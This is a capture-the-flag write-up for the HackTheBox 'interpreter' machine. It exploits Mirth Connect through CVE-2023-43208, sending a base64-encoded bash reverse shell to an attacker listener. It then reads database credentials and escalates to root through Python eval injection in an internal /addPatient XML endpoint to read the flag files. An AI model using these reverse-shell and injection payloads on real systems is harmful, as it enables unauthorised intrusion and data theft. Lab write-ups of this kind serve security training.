@@ -1,0 +1,286 @@
+---
+title: interpreter
+date: '2026-02-22'
+description: 'HTB machine Season 10'
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - HTB
+  - LINUX
+  - MEDIUM
+cover: /mc/images/mirth.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this write-up, we will walk through the steps to hack the interpreter machine on Hack The Box. Let's dive in!
+
+# Recon
+
+We began by performing an **Nmap** scan to identify open ports and services on the target machine.
+
+```bash
+nmap 10.129.1.159 -A -T5
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-21 20:49 -0500
+Nmap scan report for 10.129.1.159
+Host is up (0.051s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
+|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
+80/tcp  open  http     Jetty
+|_http-title: Mirth Connect Administrator
+| http-methods: 
+|_  Potentially risky methods: TRACE
+443/tcp open  ssl/http Jetty
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mirth-connect
+| Not valid before: 2025-09-19T12:50:05
+|_Not valid after:  2075-09-19T12:50:05
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Mirth Connect Administrator
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT      ADDRESS
+1   49.98 ms 10.10.14.1
+2   50.91 ms 10.129.1.159
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.86 seconds
+```
+
+## Web app + vulnerability research
+
+so we're gonna access the website and see what application is hosted there , the application seems  like an application for healthcare ,
+We're gonna start googling to see if there is any related CVE or something can lead us further
+
+so we find a CVE-2023-43208 so we're gonna try and see if we can get the shell with it so I tried to execute this POC 
+https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc/blob/master/CVE-2023-43208.py
+
+so I tried many times to execute the simple rev shell , until i see that there is a Runtime.exec() , by asking ChatGPT we know that the Runtime.exec is fragile and weak with the shell metacharacters(>,&) or it can be a WAF who knows  , so I tried to encode the rev shell and
+
+```bash
+shell= $(echo 'bash -i >& /dev/tcp/[ip]/1234 0>&1' | base64)
+```
+
+after that we're gonna execute the payload 
+
+```bash
+python3 CVE-2023-43208.py -u https://[ip]  -c "bash -c {echo,($shell)}|{base64,-d}|{bash,-i}"
+```
+## Initial access
+after that we're gonna get the shell with nc
+
+```bash
+nc -vlntp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.142] from (UNKNOWN) [10.129.1.155] 44402
+bash: cannot set terminal process group (3496): Inappropriate ioctl for device
+bash: no job control in this shell
+mirth@interpreter:/usr/local/mirthconnect$
+```
+
+## Post-exploitation enumeration
+
+we got the shell, we're gonna look inside the machine , and see if something interesting gonna appear , so looking for database or some configuration about the application i found that there are some files in the /usr/local/mirthconnect
+
+```bash
+cat /usr/local/mirthconnect/conf/mirth.properties
+
+# database credentials
+database.username = mirthdb
+database.password = MirthPass123!
+## Enumearte for User
+```
+so we found a password for the database, let's connect and see if there is any password stored there 
+
+```bash
+mirth@interpreter:/usr/local/mirthconnect$ mysql -u mirthdb -p'MirthPass123!' mc_bdd_prod -e "select p.ID,p.USERNAME,pp.PASSWORD from PERSON p join PERSON_PASSWORD pp on p.ID=pp.PERSON_ID;"
+ID      USERNAME        PASSWORD
+2       sedric  u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
+```
+
+I tried to crack this password but no hope , uncrackable :(
+
+## Internal port enumeration
+
+we enumerate the ports to see if there are any open ports 
+
+
+```bash 
+mirth@interpreter:/usr/local/mirthconnect$ ss -nltp
+State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                          
+LISTEN 0      256          0.0.0.0:6661       0.0.0.0:*    users:(("java",pid=3496,fd=335))
+LISTEN 0      50           0.0.0.0:80         0.0.0.0:*    users:(("java",pid=3496,fd=327))
+LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                    
+LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                    
+LISTEN 0      50           0.0.0.0:443        0.0.0.0:*    users:(("java",pid=3496,fd=331))
+LISTEN 0      128        127.0.0.1:54321      0.0.0.0:*                                    
+LISTEN 0      128             [::]:22            [::]:*
+```
+hmm a port like 54321 is suspicious , so I send an request  to see what on the earth is going on this internal port 
+
+```bash
+timeout 3 bash -c "printf 'GET / HTTP/1.1\r\nHost: localhost\r\n\r\n' | nc 127.0.0.1 54321 -nv" 2>&1 | head -n 40
+
+HTTP/1.1 404 NOT FOUND
+Server: Werkzeug/2.2.2 Python/3.11.2
+Date: Sun, 22 Feb 2026 03:14:38 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 207
+Connection: close
+
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+```
+
+hmm a Werkzeug server and python3
+
+after having this information we gonna try to see what process behind this port 
+
+```bash 
+# 3) Identify process behind 54321
+# 3) Identify process behind 54321
+ps -ef | grep -Ei "python|werkzeug|54321" | grep -v grep
+
+mirth@interpreter:/usr/local/mirthconnect$ ps -ef | grep -Ei "python|werkzeug|54321" | grep -v grep
+<f | grep -Ei "python|werkzeug|54321" | grep -v grep
+root        3461       1  0 19:48 ?        00:00:04 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+root        3508       1  0 19:48 ?        00:00:01 /usr/bin/python3 /usr/local/bin/notif.py
+```
+
+## Endpoint discovery: /addPatient
+
+so we got fail2ban script and notif.py script , the problem is that we don't have any
+after a hint from a friend, who told me that there is an endpoint called /addPatient that accept XML
+I tried to add a patient with this XML to see if it works or not 
+
+
+```XML
+<patient>
+  <timestamp>20250101000001</timestamp>
+  <sender_app>Me</sender_app>
+  <id>4444</id>
+  <firstname>Someone</firstname>
+  <lastname>was</lastname>
+  <birth_date>09/09/1999</birth_date>
+  <gender>F</gender>
+</patient>
+```
+
+so we're gonna create a one-line Python script that creates this 
+```bash
+python3 -c 'import requests;u="http://127.0.0.1:54321/addPatient";x="<patient><timestamp>20250101000001</timestamp><sender_app>Me</sender_app><id>4444</id><firstname>Someone</firstname><lastname>was</lastname><birth_date>09/09/1999</birth_date><gender>M</gender></patient>";r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8);print(r.status_code);print(r.text)'
+
+Patient Someone was (M), 27 years old, received from Me at 20250101000001
+```
+
+## Exploitation (eval injection)
+
+this is gonna create a patient so we're gonna try if we could inject our payload in the XML code as we did in the first on the CVE
+
+so we're gonna start inject our first payload 
+
+```python
+import("os").popen("id").read()
+```
+
+we're gonna use the same command we create the patient 
+```bash
+python3 - <<'PY'
+import requests
+u="http://127.0.0.1:54321/addPatient"
+p='{import("os").popen("id").read()}'
+x=f"<patient><timestamp>20250101120000</timestamp><sender_app>TEST</sender_app><id>12345</id><firstname>{p}</firstname><lastname>Doe</lastname><birth_date>01/01/1990</birth_date><gender>M</gender></patient>"
+r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8)
+print(r.text)
+PY
+[EVAL_ERROR] f-string: invalid syntax (<string>, line 1)
+```
+
+the payload returns eval syntax error :
+[EVAL_ERROR] f-string: invalid syntax
+that proves a f-string-like eval path 
+
+so after correcting the python payload we're gonna use this
+
+```xml
+<firstname>{__import__("os").popen("id").read()}</firstname>
+```
+
+so the output is gonna be like this 
+
+```bash
+python3 - <<'PY'
+import requests
+u="http://127.0.0.1:54321/addPatient"
+p='{__import__("os").popen("id").read().strip()}'
+x=f"""<patient>
+<timestamp>20250101000001</timestamp>
+<sender_app>Me</sender_app>
+<id>4444</id>
+<firstname>{p}</firstname>
+<lastname>was</lastname>
+<birth_date>09/09/1999</birth_date>
+<gender>F</gender>
+</patient>"""
+r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8)
+print(r.text)
+PY
+
+Patient uid=0(root) gid=0(root) groups=0(root)
+Doe (M), 36 years old, received from TEST at 20250101120000
+```
+
+as we can see, we successfully executed the id command 
+
+## Reading flags
+
+so all that remains is to read the flag files and that's easy just by modifying the payload page
+
+```bash
+python3 - <<'PY'
+import requests
+u="http://127.0.0.1:54321/addPatient"
+p='{__import__("builtins").open(chr(47)+"root"+chr(47)+"root.txt").read().strip()}'
+x=f"""<patient>
+<timestamp>20250101000001</timestamp>
+<sender_app>Me</sender_app>
+<id>4444</id>
+<firstname>{p}</firstname>
+<lastname>was</lastname>
+<birth_date>09/09/1999</birth_date>
+<gender>F</gender>
+</patient>"""
+r=requests.post(u,data=x,headers={"Content-Type":"application/xml"},timeout=8)
+print(r.text)
+PY
+
+Patient 7a6af1XXXXXXXXXXXXXXXXXXX Doe (M), 36 years old, received from TEST at 20250101120000
+```
+
+for the user flag, all you need to do is change the payload 
+```python
+__import__("builtins").open(chr(47)+"root"+chr(47)+"root.txt").read().strip()
+```
+to this payload 
+```python
+__import__("builtins").open(chr(47)+"home"+chr(47)+"sedric"+chr(47)+"user.txt").read().strip()
+```
+Note:
+I tried many times to get the shell code , but all I got is 200 [INVALID_INPUT]
